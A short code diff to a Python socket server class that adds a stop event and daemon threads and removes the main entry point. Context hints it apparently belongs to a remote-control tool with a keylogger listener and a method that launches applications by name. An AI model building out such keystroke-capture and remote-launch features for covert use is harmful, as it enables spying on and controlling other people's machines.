@@ -43,13 +43,15 @@ class Server:
     self.server.bind(self.addr)
     self.keylogger_listener = None
 
-  def run(self):
+  def run(self, stop):
     self.server.listen(5)
     print(f'Server is listening on {self.host}:{self.port}')
     while True:
         conn, addr = self.server.accept()
-        thread = threading.Thread(target=self.handle_client, args=(conn, addr))
+        thread = threading.Thread(target=self.handle_client, args=(conn, addr), daemon=True)
         thread.start()
+        if stop.is_set():
+          break
 
   # Handle client connection
   def handle_client(self, conn, addr):
@@ -187,7 +189,3 @@ class Server:
 
   def start_app(self, app_name):
     os.startfile(app_name)
-
-if __name__ == '__main__':
-  server = Server()
-  server.run()
